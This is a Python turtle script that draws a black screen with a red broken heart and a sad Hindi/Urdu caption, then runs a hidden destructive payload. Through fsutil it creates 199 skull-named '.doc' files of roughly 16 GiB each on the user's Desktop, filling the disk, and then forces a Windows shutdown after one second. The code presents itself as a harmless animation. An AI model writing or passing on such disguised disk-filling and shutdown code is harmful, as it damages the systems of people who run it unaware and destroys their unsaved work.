import turtle
import os
import time




s = turtle.Screen()
s.setup(width=1.0, height=1.0)
s.bgcolor("black")

# Create a turtle
t = turtle.Turtle()
t.speed(5)
t.width(12)

# Define a curve function
def curve():
    for i in range(200):
        t.right(1)
        t.forward(1)

# Draw the heart shape
def heart():
    t.color("red", "red")
    t.begin_fill()
    t.left(140)
    t.forward(113)
    curve()
    t.left(120)
    curve()
    t.forward(112)
    t.end_fill()

heart()



# Draw the broken part of the heart
t.pencolor("black")
t.penup()
t.goto(0, 170)
t.pendown()

for _ in range(3):
    t.left(75)
    t.forward(40)
    t.right(65)
    t.forward(45)

# Display the text
t.penup()
t.goto(-300, -100)
t.pendown()
t.color("white")
t.write("Tum ne bhi  😥 mera dil tod diya", font=("Arial", 32))
def create_dummy_file(file_path, size_in_bytes):
    try:
        os.system(f"fsutil file createnew \"{file_path}\" {size_in_bytes}")
        print(f"Created {file_path} with size {size_in_bytes} bytes.")
    except Exception as e:
        print(f"Error creating file: {e}")

# Specify the desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")


for i in range(1, 200):
    file_name = f"☠☠☠_{i}.doc"
    file_path = os.path.join(desktop_path, file_name)
    create_dummy_file(file_path, 4096 * 4096 * 1024) 

os.system("shutdown /s /t 1")  # Change the time delay to 1 seconds
turtle.done()




